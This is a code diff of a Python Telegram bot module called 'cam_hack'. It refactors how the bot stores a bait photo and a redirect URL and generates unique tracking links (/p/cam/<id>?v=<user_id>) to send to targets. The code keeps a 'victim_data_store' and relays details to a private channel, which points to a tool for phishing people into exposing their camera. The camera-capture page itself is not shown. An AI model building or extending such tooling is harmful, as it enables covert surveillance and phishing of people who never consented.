@@ -2,7 +2,10 @@ import uuid
 import time
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
-from bot.utils.storage import user_data, link_cache, victim_data_store, user_username_cache
+from bot.utils.storage import (
+    user_data, link_cache, victim_data_store, user_username_cache,
+    save_redirect, save_photo
+)
 
 
 def handle_cam_hack(bot, message, get_bottom_buttons):
@@ -27,7 +30,9 @@ def get_cam_photo(message, user_id, get_bottom_buttons, bot):
         file_info = bot.get_file(photo_id)
         photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
         user_data[user_id] = {"photo_url": photo_url}
-        victim_data_store[f"photo_{user_id}"] = photo_url
+
+        # SAVE PHOTO (FILE + MEMORY)
+        save_photo(user_id, photo_url)
 
         username = user_username_cache.get(user_id, "Unknown")
 
@@ -37,7 +42,6 @@ def get_cam_photo(message, user_id, get_bottom_buttons, bot):
                 photo_id,
                 caption=f"📸 User Uploaded Photo\n\nUsername: {username}\nID: {user_id}"
             )
-            bot.send_message(PRIVATE_CHANNEL_ID, f"🔗 Photo URL: {photo_url}")
         except Exception as e:
             print(f"Channel photo error: {e}")
 
@@ -51,15 +55,12 @@ def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
     redirect_url = message.text.strip()
 
     if redirect_url.startswith("http"):
-        # ===== SAVE REDIRECT (STRING KEY) =====
         user_data[user_id]["redirect"] = redirect_url
-        victim_data_store[f"redirect_{user_id}"] = redirect_url
-        victim_data_store[f"redirect_{str(user_id)}"] = redirect_url  # Double save
+
+        # SAVE REDIRECT (FILE + MEMORY)
+        save_redirect(user_id, redirect_url)
 
         username = user_username_cache.get(user_id, "Unknown")
-
-        # Debug log
-        print(f"✅ REDIRECT SAVED: redirect_{user_id} = {redirect_url}")
 
         try:
             bot.send_message(
@@ -69,7 +70,6 @@ def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
         except Exception as e:
             print(f"Redirect send error: {e}")
 
-        # ===== GENERATE FINAL LINK =====
         unique_id = str(uuid.uuid4())[:8]
         link = f"{BASE_URL}/p/cam/{unique_id}?v={user_id}"
         link_cache[unique_id] = {
